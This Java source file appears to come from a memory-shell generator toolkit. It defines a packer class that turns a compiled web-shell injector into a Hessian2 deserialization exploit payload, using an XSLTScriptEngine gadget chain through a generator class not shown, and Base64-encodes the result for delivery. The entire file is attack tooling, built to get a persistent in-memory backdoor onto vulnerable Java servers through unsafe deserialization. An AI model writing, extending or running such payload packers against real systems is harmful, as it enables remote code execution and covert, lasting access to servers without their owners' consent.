package com.reajason.javaweb.memshell.packer.deserialize.hessian;

import com.reajason.javaweb.deserialize.DeserializeConfig;
import com.reajason.javaweb.deserialize.Hessian2DeserializeGenerator;
import com.reajason.javaweb.deserialize.PayloadType;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import org.apache.commons.codec.binary.Base64;

/**
 * @author ReaJason
 * @since 2025/2/20
 */
public class Hessian2XSLTScriptEnginePacker implements Packer {
    @Override
    public String pack(GenerateResult generateResult) {
        byte[] injectorBytes = generateResult.getInjectorBytes();
        String injectorClassName = generateResult.getInjectorClassName();
        DeserializeConfig deserializeConfig = new DeserializeConfig();
        deserializeConfig.setPayloadType(PayloadType.XSLTScriptEngine);
        byte[] generate = Hessian2DeserializeGenerator.generate(injectorBytes, injectorClassName, deserializeConfig);
        return Base64.encodeBase64String(generate);
    }
}
